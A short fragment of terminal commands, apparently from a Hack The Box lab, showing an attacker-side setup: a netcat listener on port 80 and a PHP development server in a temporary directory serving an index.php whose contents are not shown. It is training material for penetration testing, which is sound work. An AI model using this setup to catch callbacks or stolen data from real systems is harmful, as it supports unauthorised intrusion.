...
`bryan25@htb[/htb]$ sudo nc -lvnp 80 listening on [any] 80 ...`
...
`bryan25@htb[/htb]$ mkdir /tmp/tmpserver bryan25@htb[/htb]$ cd /tmp/tmpserver bryan25@htb[/htb]$ vi index.php #at this step we wrote our index.php file bryan25@htb[/htb]$ sudo php -S 0.0.0.0:80 PHP 7.4.15 Development Server (http://0.0.0.0:80) started`
